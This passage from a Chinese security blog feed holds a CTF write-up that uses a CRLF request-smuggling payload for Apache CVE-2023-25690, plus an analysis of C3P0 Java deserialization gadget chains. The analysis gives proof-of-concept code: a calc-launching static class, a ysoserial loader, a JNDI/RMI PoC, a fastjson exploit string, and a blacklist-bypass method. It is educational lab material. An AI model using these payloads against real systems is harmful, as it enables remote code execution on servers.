然后当时是去查了这个版本，然后找到了一个CVE,但是不懂咋用，看了赛后解，才发现我忘记收集这个<code>apache</code>的配置文件了</p><p><a href="https://xz.aliyun.com/t/12345#toc-7">apache请求走私 CVE-2023-25690</a></p><p>然后去读取配置文件</p><p><img src="../images/image-20230604205736740.png" alt="image-20230604205736740"></p><p><img src="../images/image-20230604205748044.png" alt="image-20230604205748044"></p><p>在配置文件里发现了关键信息</p><p>做了个proxy转发，猜测flag直接就在转发后当前目录flag.txt里（瞎猜就是了，大不了多试试）,利用CRLF注入，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/nssctf/<span class="number">0</span>%<span class="number">20</span>HTTP/<span class="number">1.1</span>%<span class="number">0</span>d%<span class="number">0</span>aHost:%<span class="number">20</span>localhost%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>aGET%<span class="number">20</span>/flag.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230604210535493.png" alt="image-20230604210535493"></p><p>就是根据这个payload和在上面查看的apache配置文件一起得出的结果</p><p><img src="../images/image-20230604210812996.png" alt="image-20230604210812996"></p><p><strong>可惜了   当时没想到这个配置文件</strong></p><h2 id="TimeTrcer"><a href="#TimeTrcer" class="headerlink" title="TimeTrcer"></a>TimeTrcer</h2><p><img src="../images/image-20230604202607093.png" alt="image-20230604202607093"></p><p>上面是这题的考点</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;flask-jwt&quot;&gt;&lt;a href=&quot;#flask-jwt&quot; class=&quot;headerlink&quot; title=&quot;flask?jwt?&quot;&gt;&lt;/a&gt;flask?jwt?&lt;/h2&gt;&lt;p&gt;考察的是session伪造&lt;/p&gt;
&lt;p&gt;(不写了，就是简单的session伪造</summary>
      
    
    
    
    
    <category term="NSS-round13-web" scheme="https://ke1nys.github.io/tags/NSS-round13-web/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之C3P0链利用与分析</title>
    <link href="https://ke1nys.github.io/posts/35b383c2.html"/>
    <id>https://ke1nys.github.io/posts/35b383c2.html</id>
    <published>2023-06-02T15:28:01.000Z</published>
    <updated>2023-06-12T07:01:41.439Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/nice0e3/p/15058285.html#http-base%E4%BD%BF%E7%94%A8">参考文章</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>C3P0是JDBC的一个连接池组件</strong></p><ul><li><code>JDBC</code></li></ul><p>“JDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口。<br>使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。”</p><ul><li><strong>连接池</strong></li></ul><p>“我们在讲多线程的时候说过，创建线程是一个昂贵的操作，如果有大量的小任务需要执行，并且频繁地创建和销毁线程，实际上会消耗大量的系统资源，往往创建和消耗线程所耗费的时间比执行任务的时间还长，所以，为了提高效率，可以用线程池。<br>类似的，在执行JDBC的增删改查的操作时，如果每一次操作都来一次打开连接，操作，关闭连接，那么创建和销毁JDBC连接的开销就太大了。为了避免频繁地创建和销毁JDBC连接，我们可以通过连接池（Connection Pool）复用已经创建好的连接。”</p><ul><li><code>C3p0</code></li></ul><p><strong>C3P0是</strong>一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。 使用它的开源项目有Hibernate、Spring等。</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><ul><li><p><strong>URLClassLoader   也叫   http base链</strong></p></li><li><p><strong>hex base</strong></p></li><li><strong>jndi</strong></li></ul><p>一共就是这三个利用链(<strong>下面是利用链分析</strong>)</p><h3 id="URLClassLoader-http-base"><a href="#URLClassLoader-http-base" class="headerlink" title="URLClassLoader(http base)"></a>URLClassLoader(http base)</h3><p>先搭建环境来测试</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>先导入maven</p><p>然后写个恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>特别重要的一点就是别在idea里边进行编译,还有就是编译的时候别加上package </strong> (血的教训)</p><p>接着写个demo(记得导入<strong>ysoserial.jar</strong>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"><span class="keyword">import</span> ysoserial.Serializer;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.C3P0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// PayloadRunner.run(C3P0.class, args);</span></span><br><span class="line">        <span class="type">C3P0</span> <span class="variable">c3P0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C3P0</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> c3P0.getObject(<span class="string">&quot;http://127.0.0.1:8000/:calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] serialize = Serializer.serialize(object);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialize);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在编译的文件目录下开个python服务</p><p><img src="../images/image-20230607101451858.png" alt="image-20230607101451858"></p><p><img src="../images/image-20230607101546804.png" alt="image-20230607101546804"></p><h4 id="分析链子"><a href="#分析链子" class="headerlink" title="分析链子"></a>分析链子</h4><p><img src="../images/image-20230607103131303.png" alt="image-20230607103131303"></p><p>跟进<code>getObject</code>这个类</p><p><img src="../images/image-20230607103210687.png" alt="image-20230607103210687"></p><p>这里话是对我们传进的url进行分解  分解为url和classname</p><p>反射创建了一个<code>PoolBackedDataSource</code>实例对象，然后反射将<code>connectionPoolDataSource</code>的值设置为<code>PoolSource</code>类的实例，传递<code>className</code>和<code>url</code>参数。即我们传入的远程地址和类名。</p><p><strong>然后我们直接来跟这个反序列化入口</strong><code>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject</code></p><p><img src="../images/image-20230607105927591.png" alt="image-20230607105927591"></p><p>在入口点打个断点进行分析</p><p><img src="../images/image-20230607110021890.png" alt="image-20230607110021890"></p><p>判断反序列化的参数类型是否是<code>IndirectlySerialized</code>,是的话进入<code>getobject()</code>方法</p><p><img src="../images/image-20230607110134630.png" alt="image-20230607110134630"></p><p>然后接着进入这个类里边</p><p><img src="../images/image-20230607110257304.png" alt="image-20230607110257304"></p><p>获取到类名和url</p><p><img src="../images/image-20230607110405794.png" alt="image-20230607110405794"></p><p>然后接着进入到这个<code>URLClassLoader</code>方法   </p><p>关键点来了</p><p><img src="../images/image-20230607110520336.png" alt="image-20230607110520336"></p><p>一般来说这个三个方法是成对出现的  </p><p>(<strong>这里的一些参数能直接获取到是因为在序列化的时候进行了赋值</strong>)    <a href="https://www.cnblogs.com/nice0e3/p/15058285.html#http-base%E4%BD%BF%E7%94%A8">参考文章</a></p><p><code>ForName</code>是为了初始化    <code>newInstance</code>是为了实例化  因为我们构造的恶意代码是个静态代码块，在初始话的时候就会自动执行了，不需要下面的实例化了</p><p><img src="../images/image-20230607110951148.png" alt="image-20230607110951148"></p><p>这里话要重新实例化一遍URL是因为这里的<code>URLClassloader</code>需要接收的参数是<code>URL</code>数组</p><p><strong>Gadget</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject</span><br><span class="line">-&gt;ReferenceIndirector.getObject()</span><br><span class="line">-&gt;ReferenceableUtils.referenceToObject</span><br><span class="line">(然后在referenceToObject#forname执行代码)</span><br></pre></td></tr></table></figure><h3 id="jndi"><a href="#jndi" class="headerlink" title="jndi"></a>jndi</h3><p><img src="../images/image-20230607113223538.png" alt="image-20230607113223538"></p><p><strong>POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">c3p_jndi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">JndiRefConnectionPoolDataSource</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JndiRefConnectionPoolDataSource</span>();</span><br><span class="line">        exp.setJndiName(<span class="string">&quot;rmi://127.0.0.1:10099/exp&quot;</span>);</span><br><span class="line">        exp.setLoginTimeout(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    fastjson exp:</span></span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;object\&quot;:[\&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource\&quot;,&#123;\&quot;jndiName\&quot;:\&quot;rmi://localhost:8088/Exploit\&quot;, \&quot;loginTimeout\&quot;:0&#125;]&#125;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="分析链子-1"><a href="#分析链子-1" class="headerlink" title="分析链子"></a>分析链子</h4><p>因为这个是可以用来打fastjson的，所以说这里的关键就是<code>JndiRefConnectionPoolDataSource</code>里面的set方法</p><p><img src="../images/image-20230607152255721.png" alt="image-20230607152255721"></p><p>然后跟进这个方法</p><p><img src="../images/image-20230607153202545.png" alt="image-20230607153202545"></p><p>然后发现会给<code>JndiName</code>赋值之后会调用下图的这个方法</p><p><img src="../images/image-20230607153347350.png" alt="image-20230607153347350"></p><p><strong>在这个jndi给赋值之后</strong></p><p>接着调用另一个set方法 </p><p><img src="../images/image-20230607154707647.png" alt="image-20230607154707647"></p><p>然后调用到<code>WrapperConnectionPoolDataSource</code>的<code>setLoginTimeout</code>的方法里面</p><p><img src="../images/image-20230607154728229.png" alt="image-20230607154728229"></p><p>这里调用到这个里的方法是因为  <code>wcpds</code>是属于这个类的</p><p><img src="../images/image-20230607154857985.png" alt="image-20230607154857985"></p><p>然后就接着跳到了这个类的<code>JndiRefForwardingDataSource</code>的<code>setLoginTimeout</code>方法里</p><p><img src="../images/image-20230607155444372.png" alt="image-20230607155444372"></p><p>重点就是这个<code>inner()</code>方法了   跟进他</p><p><img src="../images/image-20230607155536695.png" alt="image-20230607155536695"></p><p>然后发现它会调用这个<code>dereference</code>方法   跟进去</p><p><img src="../images/image-20230607155629666.png" alt="image-20230607155629666"></p><p>最后就会在这个<code>dereference()</code>方法里调用lookup方法来执行我的rmi恶意服务代码</p><p><strong>最后测试一下代码可行性</strong></p><p><img src="../images/image-20230607160745876.png" alt="image-20230607160745876"></p><p>在kali搭建一个rmi恶意服务</p><p><img src="../images/image-20230607160832728.png" alt="image-20230607160832728"></p><p>发现是会弹计算器的    </p><h3 id="hex-base-二次反序列化"><a href="#hex-base-二次反序列化" class="headerlink" title="hex base(二次反序列化)"></a>hex base(二次反序列化)</h3><p>这个方法可以用来进行二次反序列化的绕过</p><p>如果不出网，而且是<code>fastjson</code>或<code>jackson</code>的情况，可以用这个Gadget。</p><p>这里其实就是常听到的就是用C3P0二次反序列化打Fastjson，因为像Fastjson和Jackson在反序列化时都会触发setter方法的执行，而C3P0中<code>userOverridesAsString</code>的setter会将<code>HexAsciiSerializedMap</code>开头的hex字符串进行解码再去触发Java原生的反序列化</p><ul><li>其实简单来说就是这个序列化的时候会先生成一堆16进制的字符串，然后这些字符串就可以绕过黑名单检测(<strong>这就是二次反序列化的用法</strong>)</li></ul><p>先写个demo来触发</p><p><img src="../images/image-20230608155736546.png" alt="image-20230608155736546"></p><p>(<strong>注意这里绕过<code>HexAsciiSerializedMap</code>后面跟着的16进制字符串不对的话，是不会进入到序列化那个类里边的，在转化为字节流的时候就会告诉你失败</strong>)</p><p>接着来到这个类里边</p><p><img src="../images/image-20230608155946848.png" alt="image-20230608155946848"></p><p>给<code>this.userOverridesAsString</code>赋值</p><p>然后最后会调用到这个函数</p><p><img src="../images/image-20230608160020522.png" alt="image-20230608160020522"></p><p><img src="../images/image-20230608160048629.png" alt="image-20230608160048629"></p><p>这里的话会先截取<code>HexAsciiSerializedMap</code>后面跟着的16进制，然后将其转化为字节数组</p><p><img src="../images/image-20230608160149510.png" alt="image-20230608160149510"></p><p>然后接着进入到这个<code>formByteArray</code>函数里</p><p><img src="../images/image-20230608160228255.png" alt="image-20230608160228255"></p><p>接着进入到这个<code>deserializeFromByteArray</code>这个函数里</p><p><img src="../images/image-20230608160333740.png" alt="image-20230608160333740"></p><p>最后在这里进行反序列化</p><p>(所以说利用方法就是将序列化的结果转化为16进制放在<strong><code>HexAsciiSerializedMap</code></strong>的后面，然后传入<code>wrapperConnectionPoolDataSource.setUserOverridesAsString()</code>)</p><p>这样就可以进行黑名单绕过了</p><p>在<code>fastjson</code>，<code>jackson</code>等环镜下，<code>userOverridesAsString</code>属性可控，导致可以从其setter方法<code>setuserOverridesAsString</code>开始到最后<code>deserializeFromByteArray</code>对其调用<code>readObject</code>进行反序列化，造成反序列化漏洞</p><p>这里的有一道题会来讲解这个c3p0二次反序列化的用法</p><p><a href="https://ke1nys.github.io/posts/450c467.html#babyja-2023%E9%BB%91%E7%9B%BE%E6%9D%AF">babyja 黑盾杯 2023</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/nice0e3/p/15058285.html#http-base%E4%BD%BF%E7%94%A8&quot;&gt;参考文章&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;heade</summary>
      
    
    
    
    
    <category term="Java安全之C3P0链利用与分析" scheme="https://ke1nys.github.io/tags/Java%E5%AE%89%E5%85%A8%E4%B9%8BC3P0%E9%93%BE%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>show-php反序列化</title>
    <link href="https://ke1nys.github.io/posts/edbe2217.html"/>
    <id>https://ke1nys.github.io/posts/edbe2217.html</id>
    <published>2023-05-31T07:13:34.000Z</published>
    <updated>2023-07-10T13:07:21.142Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="8e1146f04b93e77166a33373824489a098ba022a6c1c33e5f8a4ec931eff0429"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-php反序列化" scheme="https://ke1nys.github.io/tags/show-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
</feed>
